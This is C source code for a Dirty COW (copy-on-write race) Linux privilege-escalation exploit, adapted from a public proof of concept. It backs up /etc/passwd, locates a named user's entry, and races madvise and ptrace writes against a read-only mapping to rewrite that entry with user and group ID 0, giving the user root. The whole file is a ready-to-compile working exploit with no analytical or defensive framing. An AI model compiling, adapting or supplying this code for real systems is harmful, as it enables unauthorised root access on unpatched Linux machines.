// dirty cow
// write-on-specific-location version
// implemented from https://github.com/firefart/dirtycow
// jaewon Heo

#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <crypt.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <pthread.h>
#include <stdint.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>


// hash is not required due to the shadow file.
const char* passwd_file = "/etc/passwd";
const char* passwd_back = "/tmp/passwd.bak";

int fd;
void* map;
struct stat st;
pid_t pid;
pthread_t pth;

struct user_info {
    char* username;
    char hash;
    char user_id;
    char group_id;
    char* info;
    char* home_dir;
    char* shell;
};

int get_off(char* username) {
    int offset = 0;
    int bread = 0;
    char buffer;
    int index = 0;
    while((bread = read(fd, &buffer, 1)) > 0) {

        if(username[index] == buffer) {
            index++;
            if(index == strlen(username)) {
                break;
            }
        }
        else {
            index = 0;
        }

        offset += bread;
    }

    if(index != strlen(username)) {
        return -1;
    }
    else {
        printf("found user\n");
        return offset - (strlen(username) - 1);
    }
}   

void* madvise_thread(void* args) {
    int i;
    int c = 0;
    for(i = 0; i < 200000000; i++) {
        c += madvise(map, st.st_size + sizeof(long), MADV_DONTNEED);
    }

    fprintf(stdout, "madvise() returned %d\n", c);
}

int copy_file() {
    if(access(passwd_back, F_OK) != -1) {
        fprintf(stderr, "backup file already exists\n");
        return -1;
    }
    
    FILE* src;
    FILE* dest;
    char ch;

    src = fopen(passwd_file, "r");
    if(src == NULL) {
        fprintf(stderr, "cannot open passwd file\n");
        return -1;
    }

    dest = fopen(passwd_back, "w");
    if(dest == NULL) {
        fprintf(stderr, "cannot create backup file\n");
        fclose(src);
        return -1;
    }

    while((ch = fgetc(src)) != EOF) {
        fputc(ch, dest);
    }

    fprintf(stdout, "backup successful\n");

    fclose(src);
    fclose(dest);
    return 0;

}

char* construct_user_str(struct user_info* user) {
    char* format = "%s:%c:%d:%d:%s:%s:%s%s\n";
    char* ret = NULL;
    char* paddings = NULL;
    int i;
    int null_size = 0;

    // uid + gid = 2, 6 colons, 1 escape sequence, 1 hash(character x), with null paddings = have to be divisible by 8
    unsigned int size = 10 + strlen(user->username) + strlen(user->info) + strlen(user->home_dir) + strlen(user->shell);

    if(size % sizeof(long) == 0) {
        paddings = (char*)malloc(sizeof(long));
        memset((void*)paddings, 0, sizeof(long));
        ret = (char*)malloc(size + sizeof(long));
    }
    else {
        for(i = 0; i < sizeof(long); i++) {
            if((size + i) % sizeof(long) == 0) {
                null_size = i;
                break;
            }
        }

        paddings = (char*)malloc(null_size);
        memset((void*)paddings, 0, null_size);
        ret = (char*)malloc(size + null_size);
    }

    sprintf(ret, 
        format, 
        user->username, 
        user->hash, 
        user->user_id, 
        user->group_id, 
        user->info, 
        user->home_dir, 
        user->shell, 
        paddings);
    return ret;

}


int main(int argc, char* argv[]) {

    if(argc != 2) {
        fprintf(stderr, "usage: ./dirty <username>\n");
        exit(1);
    }

    if(copy_file() != 0) {
        fprintf(stderr, "closing program\n");
        exit(-1);
    }


    fd = open("/etc/passwd", O_RDONLY);
    struct user_info user;
    int offset;
    char* completed = NULL;

    if(fd < 0) {
        fprintf(stderr, "cannot open file\n");
        exit(1);
    }

    fstat(fd, &st);
    offset = get_off(argv[1]);

    if(offset < 0) {
        fprintf(stderr, "cannot find user\n");
        exit(1);
    }

    user.username = argv[1];
    user.hash = 'x';
    user.user_id = 0;
    user.group_id = 0;
    user.info = "pawned";
    user.shell = "/bin/bash";

    int user_home_len = strlen(argv[1]) + 5;
    char* user_home_buffer = (char*)malloc(user_home_len + 1);
    
    strcpy(user_home_buffer, "/home/");
    strcat(user_home_buffer, argv[1]);
    user.home_dir = user_home_buffer;

    map = mmap(NULL, st.st_size + sizeof(long), PROT_READ, MAP_PRIVATE, fd, 0);
    completed = construct_user_str(&user);

    printf("completed: %s\n", completed);
    pid = fork();
    if(pid) {
        waitpid(pid, NULL, 0);
        int u, o, i, l, c = 0;
        l = strlen(completed);
        for(u = 0; u < 10000/l; u++) {
            for(o = 0; o < l; o += sizeof(long)) {
                for(i = 0; i < 10000; i++) {
                    ptrace(PTRACE_POKETEXT, pid, map + o + offset, *((long*)(completed + o)));
                }
            }
        }
    }
    else {
        pthread_create(&pth, NULL, madvise_thread, NULL);
        ptrace(PTRACE_TRACEME);
        kill(getpid(), SIGSTOP);
        pthread_join(pth, NULL);
    }

    close(fd);
    return 0;   
    
}